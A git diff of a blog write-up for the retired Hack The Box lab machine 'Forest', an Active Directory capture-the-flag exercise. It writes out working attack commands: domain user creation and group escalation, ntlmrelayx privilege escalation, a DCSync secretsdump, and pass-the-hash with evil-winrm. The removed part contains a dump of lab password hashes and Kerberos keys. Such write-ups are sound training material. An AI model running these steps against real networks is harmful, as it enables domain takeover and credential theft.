@@ -7,18 +7,19 @@ tags: [linux, Active Directory, Kali, Pentest, writeups, ctf]
 My write-up / walktrough for Forest on Hack The Box. 
 
 # Quick summary
-today, Forest got retired and I'm allowed to publish my write-up. Forest is my second box on HTB, so still pleeeeenty of new things to learn for me ;-)
+Today, Forest got retired and I'm allowed to publish my write-up. Forest is my second box on HTB, so still pleeeeenty of new things to learn for me ;-)
 
 I added the box to `/etc/hosts` as `forest.htb` with it's ip `10.10.10.161`
 
 ![forest](/images/forest/forest.png)
 
 # Enumeration
-I started with `nmap -sV -p 1-10000 -T5 forest.htb` and revealed plenty of open ports. Well, as the box-name allready mentioned, there is an Active Directory running on it.
+I started with 
+`nmap -sV -p 1-10000 -T5 forest.htb` and revealed plenty of open ports. Well, as the box-name allready mentioned, there is an Active Directory running on it.
 
 ![nmap](/images/forest/nmap.png)
 
-So let's try to gather some usernames. I used `legion`, added `forest.htb` as only host to it and let it run. After a while, `smbenum` gave me the following user:
+So let's try to gather some usernames. I used `legion`, added `forest.htb` as the only host to it and let it run. After a while, `smbenum` gave me the following user:
 
 ```
 user:[Administrator] rid:[0x1f4]
@@ -80,124 +81,54 @@ this credentials, I could use to establish a connection with winrm (`evil-winrm 
 
 ![userflag](/images/forest/userflag.png)
 
+# Privilege escalation
+
 Tried with `winPEASany.exe` to escalate privilegies. The command
-`evil-winrm -i forest.htb -u svc-alfresco -p s3rvice -e .` and `Invoke-Binary winPEASany.exe` started the process to scan forest.htb.local, but this was a loose end to me.
+`evil-winrm -i forest.htb -u svc-alfresco -p s3rvice -e .` , `menue` and `Invoke-Binary winPEASany.exe` started the process to scan forest.htb.local, but apart of some missconfiguration (disabled firewall and so on) this was a loose end to me.
 
+## Bloodhound
+I then took a deeper look into the Active Directory by gathering and displaying data for `Bloodhound` 
 
+![bloodhound](/images/forest/bloodhound.png)
 
-net user John fadf24as /ADD /DOMAIN
-evil-winrm -i 10.10.10.161 -u John -p fadf24as
+Done so, I noticed that `svc-alfresco` has the right to create user in the Active Directory. May be, I can create a user and escalate it's privilege?
 
-net group "Exchange Trusted Subsystem" John /add
+![accoutoperator](/images/forest/accountoperator.png)
 
-net group "Exchange Windows Permissions" John /add 
+## User creation
+To do that, I reconnected with `evil-winrm -i forest.htb -u svc-alfresco -p s3rvice` to the victim and executed there the following commands:
+``` cmd
+net user fab asdfasdf81 /ADD /DOMAIN
+net group "Exchange Trusted Subsystem" fab /add
+net group "Exchange Windows Permissions" fab /add 
+```
 
+## Dump the secrets
+Now, I could try to escalate the privilegies of the new user `fab` so that I afterwards could start a `dcsync-attack`.Therefore, I used the tools `secretsdump.py` and `ntlmrelayx.py`, both from `impacket`.
 
-faebu@kali:/usr/local/bin$ sudo python3 secretsdump.py HTB.LOCAL/John@10.10.10.161 -just-dc
-Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+First, I had to start `sudo python3 /usr/local/bin/ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user fab` and then authenticate the user by inserting the credentials on the local server. 
+![ntlmrelay](/images/forest/ntlmrelaywerver.png)
 
-Password:
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-[*] Using the DRSUAPI method to get NTDS.DIT secrets
-htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
-htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
-htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
-htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
-htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
-htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
-htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
-htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
-htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
-htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
-htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
-htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
-htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
-htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
-htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
-htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
-htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
-John:7601:aad3b435b51404eeaad3b435b51404ee:c7594c83109ddc3f3fbc7f3bb42dfec2:::
-FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:3bb8d9af0762180cd2edfb7b657a1211:::
-EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
-[*] Kerberos keys grabbed
-krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
-krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
-krbtgt:des-cbc-md5:9dd5647a31518ca8
-htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
-htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
-htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
-htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
-htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
-htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
-htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
-htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
-htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
-htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
-htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
-htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
-htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
-htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
-htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
-htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
-htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
-htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
-htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
-htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
-htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
-htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
-htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
-htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
-htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
-htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
-htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
-htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
-htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
-htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
-htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
-htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
-htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
-htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
-htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
-htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
-htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
-htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
-htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
-htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
-htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
-htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
-htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
-htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
-htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
-htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
-htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
-htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
-htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
-htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
-htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
-John:aes256-cts-hmac-sha1-96:6092b14677fbcde71103c46ce0addaaaf4734b8d95befd4024f6a14a74c1ea74
-John:aes128-cts-hmac-sha1-96:2f63a09d520cfe61dbabd1e8ffc2c56e
-John:des-cbc-md5:51347679fe7683c7
-FOREST$:aes256-cts-hmac-sha1-96:f209803679b2864dec940318b168b0d105383a8375a9b30d2f3190c9e9993fd1
-FOREST$:aes128-cts-hmac-sha1-96:2b8f3dff6b101f71ec34d9b14f16452f
-FOREST$:des-cbc-md5:a14676ba25f7cd20
-EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
-EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
-EXCH01$:des-cbc-md5:8c45f44c16975129
-[*] Cleaning up... 
+![ntlmweb](/images/forest/ntlmrelayweb.png)
 
+This started allready the necessary privilege escalation, so that I afterwards could make use of the `dcsync-attack` by executing `sudo python3 /usr/local/bin/secretsdump.py HTB.LOCAL/fab:asdfasdf81@10.10.10.161 -just-dc`
 
-f048153f202bbb2f82622b04d79129cc
+![secretdump](/images/forest/secretdump.png)
+
+# Root the box
+
+All I had to do now, was to execute a `pass the hash attack` which could be done again with `evil-winrm`:
+
+`evil-winrm -i forest.htb -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6` 
+
+and then grab the root-flag `f048153f202bbb2f82622b04d79129cc` on admins desktop.
+
+![root](/images/forest/root.png)
+
+# Conclusion 
+- still a lot to learn about Kerberos and Active Directory
+- not sure, how *noisy* my attacks were?
+- should once (or more) dig into the scripts I'm using, for better understandig of attack and defense
+- box was a great pleasure :-)
+- lost a lot of time due the fact, that the box got messed up in a way. Next time reset the box instead of retrying, retrying retrying....
+- and finally: **Thanks** and respect to [Hack The Box](https://www.hackthebox.eu/) for providing this great box and to [tundr4](https://www.hackthebox.eu/home/users/profile/158160) for helping me out as I got stuck with privilege escalation.
